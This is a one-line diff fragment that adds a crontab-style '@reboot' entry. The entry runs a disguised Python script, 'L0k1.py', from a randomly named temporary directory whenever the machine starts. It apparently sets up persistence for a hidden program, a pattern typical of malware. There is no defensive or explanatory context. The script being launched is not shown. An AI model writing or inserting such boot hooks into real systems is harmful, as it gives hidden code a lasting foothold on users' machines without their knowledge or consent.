@@ -1,0 +1,1 @@
+ @reboot python3 /tmp/_MEIDdCewt/L0k1.py
